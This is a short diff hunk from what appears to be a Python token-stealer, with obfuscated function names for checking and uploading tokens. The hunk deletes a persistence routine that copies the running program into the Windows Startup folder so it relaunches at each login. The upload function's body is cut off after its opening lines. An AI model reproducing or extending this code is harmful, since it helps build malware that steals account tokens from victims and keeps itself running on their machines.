@@ -321,22 +321,6 @@ def ch1ckT4k1n(t0k3n):
     except:
         return False
 
-if getattr(sys, 'frozen', False):
-    currentFilePath = os.path.dirname(sys.executable)
-else:
-    currentFilePath = os.path.dirname(os.path.abspath(__file__))
-
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
-
-startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startupFilePath = os.path.join(startupFolderPath, fileName)
-
-if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
-    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
-        shutil.copyfileobj(src_file, dst_file)
-
-
 def upl05dT4k31(t0k3n, path):
     global wwh000z
     headers = {
